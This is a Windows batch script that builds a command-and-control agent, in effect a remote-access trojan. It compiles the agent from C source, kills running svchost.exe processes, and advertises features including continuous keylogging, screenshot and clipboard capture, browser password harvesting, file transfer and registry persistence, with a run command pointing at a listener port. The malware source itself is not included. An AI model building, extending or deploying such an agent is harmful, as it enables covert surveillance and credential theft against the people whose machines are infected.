@echo off
echo ========================================
echo   Building C2 Agent (MinGW Compatible)
echo ========================================
echo.

REM Kill any running agent
taskkill /F /IM agent_debug.exe 2>nul
taskkill /F /IM svchost.exe 2>nul


REM Compile with all features (no extra headers needed)
gcc -o agent_debug.exe agent_debug.c ^
    -lws2_32 ^
    -lgdi32 ^
    -luser32 ^
    -ladvapi32 ^
    -lshlwapi ^
    -lshell32 ^
    -lpsapi ^
    -lntdll ^
    -D_DEBUG

if %errorlevel% equ 0 (
    echo.
    echo ========================================
    echo   BUILD SUCCESSFUL!whyx
    echo ========================================
    echo.
    echo Working Features:
    echo   ✓ Screenshot Capture
    echo   ✓ Keylogger (Continuous)
    echo   ✓ File Upload/Download
    echo   ✓ System Information
    echo   ✓ Clipboard Monitoring
    echo   ✓ Browser Password Locations
    echo   ✓ Persistence (Registry)
    echo   ✓ Uninstall
    echo   ✓ Auto-Reconnect
    echo.
    echo To run: agent_debug.exe 127.0.0.1 4444
) else (
    echo.
    echo ========================================
    echo   BUILD FAILED!
    echo ========================================
)

pause